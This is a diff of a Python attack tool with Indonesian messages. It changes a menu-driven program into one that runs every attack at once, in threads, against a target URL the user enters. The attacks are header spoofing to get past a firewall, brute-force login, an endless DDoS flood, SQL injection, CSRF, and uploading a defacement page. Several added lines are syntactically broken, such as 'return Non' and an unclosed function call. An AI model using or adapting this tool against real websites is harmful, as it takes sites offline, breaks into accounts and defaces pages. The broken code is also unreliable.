@@ -1,3 +1,4 @@
+
 import requests
 import random
 import string
@@ -24,28 +25,14 @@ M = '\033[95m'
 C = '\033[96m'
 N = '\033[0m'
 
-print(f"""{B}
-
-   _____       _     _        _____ _    _ 
-  / ____|     | |   | |      / ____| |  | |
- | (___   __ _| | __| |_   _| |    | |__| |
-  \___ \ / _` | |/ _` | | | | |    |  __  |
-  ____) | (_| | | (_| | |_| | |____| |  | |
- |_____/ \__,_|_|\__,_|\__, |\_____|_|  |_|
-                        __/ |              
-                       |___/               
-
-""")
-
 logging.basicConfig(filename='log_serangan.txt', level=logging.INFO, format='%(asctime)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
 
 def load_file(file_name):
     try:
-        file_path = os.path.join('use_agents', file_name)  
-        with open(file_path, 'r') as file:
+        with open(file_name, 'r') as file:
             return [line.strip() for line in file.readlines()]
     except FileNotFoundError:
-        logging.error(f"File {file_name} tidak ditemukan di folder 'use_agents'!")
+        logging.error(f"File {file_name} tidak ditemukan!")
         return []
 
 USER_AGENTS = load_file('user_agents.txt')
@@ -79,7 +66,7 @@ def create_session():
         'X-Forwarded-For': str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)),
     })
     return session
-
+   
 def send_request(url, session, proxy=None):
     try:
         response = session.get(url, proxies=proxy, timeout=5)
@@ -90,8 +77,8 @@ def send_request(url, session, proxy=None):
         return response
     except requests.exceptions.RequestException as e:
         print(f"Terjadi kesalahan: {e}")
-        return None
-
+        return Non
+       
 def advanced_waf_bypass(url, session):
     headers = {
         'X-Real-IP': '127.0.0.1',
@@ -106,6 +93,7 @@ def advanced_waf_bypass(url, session):
         'X-DoS-Protection': 'false'
     }
 
+    
     try:
         response = session.get(url, headers=headers, timeout=5)
         if response.status_code == 200:
@@ -135,8 +123,8 @@ def brute_force_login(url, session):
     for username in usernames:
         for password in passwords:
             payload = {"username": username, "password": password}
-            send_request(url + "/login", session)
-
+            send_request(url + "/login", session
+                         
 def flooding_ddos(url, session):
     def flood_target():
         while True:
@@ -164,7 +152,7 @@ def deface_payload(url, session, backup_file_path):
     payload = """
     <html>
         <head>
-            <title>Website Anda Telah Di H4ck</title>
+            <title>Website Anda Telah Diuji Keamanan</title>
             <style>
                 body {
                     background: linear-gradient(45deg, #1E90FF, #00BFFF, #87CEFA);
@@ -189,8 +177,8 @@ def deface_payload(url, session, backup_file_path):
         </head>
         <body>
             <h1>cyberheroes</h1>
-            <p>website error</p>
-            <p>tunggu 24 jam</p>
+            <p>error</p>
+            <p>tunggu 24jam</p>
         </body>
     </html>
     """
@@ -209,8 +197,7 @@ def deface_payload(url, session, backup_file_path):
             print(f"{R}Deface gagal! Status code: {response.status_code}{N}")
     except requests.exceptions.RequestException as e:
         logging.error(f"Deface gagal: {e}")
-        print(f"{R}Deface gagal: {e}{N}")
-
+        print(f"{R}Deface gagal: {e}{N}") 
 def restore_backup(url, backup_file_path, session):
     try:
         with open(backup_file_path, 'r') as f:
@@ -221,73 +208,58 @@ def restore_backup(url, backup_file_path, session):
             logging.info(f"Halaman asli berhasil dipulihkan di {url}")
             print(f"{G}Halaman asli berhasil dipulihkan.{N}")
         else:
-            logging.error(f"Pemulihan halaman gagal, status code: {response.status_code}")
-            print(f"{R}Pemulihan halaman gagal! Status code: {response.status_code}{N}")
+            logging.error(f"Restorasi gagal, status code: {response.status_code}")
+            print(f"{R}Restorasi gagal, status code: {response.status_code}{N}")
     except Exception as e:
-        logging.error(f"Terjadi kesalahan saat memulihkan halaman: {e}")
-        print(f"{R}Terjadi kesalahan saat memulihkan halaman: {e}{N}")
+        logging.error(f"Gagal membaca backup atau mengembalikan halaman: {e}")
+        print(f"{R}Error dalam mengembalikan halaman: {e}{N}")
 
-def attack_choice():
-    print(f"{Y}Pilih serangan yang ingin dijalankan:{N}")
-    print(f"1. Advanced WAF Bypass")
-    print(f"2. SQL Injection")
-    print(f"3. Brute Force Login")
-    print(f"4. DDoS Flooding")
-    print(f"5. CSRF Attack")
-    print(f"6. Deface Website")
-    print(f"7. Keluar")
-    
-    try:
-        choice = int(input("Masukkan pilihan (1-7): "))
-        return choice
-    except ValueError:
-        print(f"{R}Input tidak valid! Silakan pilih angka dari 1 hingga 7.{N}")
-        return 0
+def start_attack(url):
+    session = create_session()
+    if not is_valid_url(url):
+        print(f"{R}URL tidak valid! Periksa URL dan coba lagi.{N}")
+        return
+       print(f"{Y}Mulai serangan ke: {url}{N}")
+    random_delay()
+   
+    def ddos_attack():
+        flooding_ddos(url, session)
+
+    def login_bruteforce():
+        brute_force_login(url, session)
+
+    def sql_injection():
+        advanced_sql_injection(url, session)
+
+    def csrf_attack_func():
+        csrf_attack(url, session)
+       
+    def waf_bypass_func():
+        advanced_waf_bypass(url, session)
+
+    # Fungsi untuk melakukan deface
+    def deface_func():
+        deface_payload(url, session, "backup_page.html")
+
+    threads = []
+    threads.append(threading.Thread(target=ddos_attack))
+    threads.append(threading.Thread(target=login_bruteforce))
+    threads.append(threading.Thread(target=sql_injection))
+    threads.append(threading.Thread(target=csrf_attack_func))
+    threads.append(threading.Thread(target=waf_bypass_func))
+    threads.append(threading.Thread(target=deface_func))
+
+    for thread in threads:
+        thread.start()
+
+    for thread in threads:
+        thread.join()
+
+    print(f"{G}Serangan selesai!{N}")
 
 def main():
-    url = input("Masukkan URL target (misalnya http://example.com): ")
-    if not is_valid_url(url):
-        print(f"{R}URL tidak valid. Pastikan menggunakan http:// atau https://{N}")
-        return
-
-    print(f"Target URL: {url}")
-    
-    while True:
-        choice = attack_choice()
-
-        session = create_session()
-
-        if choice == 1:
-            print(f"{G}Melakukan Advanced WAF Bypass...{N}")
-            advanced_waf_bypass(url, session)
-
-        elif choice == 2:
-            print(f"{G}Melakukan SQL Injection...{N}")
-            advanced_sql_injection(url, session)
-
-        elif choice == 3:
-            print(f"{G}Melakukan Brute Force Login...{N}")
-            brute_force_login(url, session)
-
-        elif choice == 4:
-            print(f"{G}Melakukan DDoS Flooding...{N}")
-            flooding_ddos(url, session)
-
-        elif choice == 5:
-            print(f"{G}Melakukan CSRF Attack...{N}")
-            csrf_attack(url, session)
-
-        elif choice == 6:
-            backup_file_path = "backup_page.html"
-            print(f"{G}Melakukan Deface Website...{N}")
-            deface_payload(url, session, backup_file_path)
-
-        elif choice == 7:
-            print(f"{Y}Keluar dari program.{N}")
-            break
-
-        else:
-            print(f"{R}Pilihan tidak valid. Silakan pilih antara 1 hingga 7.{N}")
+    url = input(f"{B}Masukkan URL target untuk diserang: {N}")
+    start_attack(url)
 
 if __name__ == "__main__":
     main()
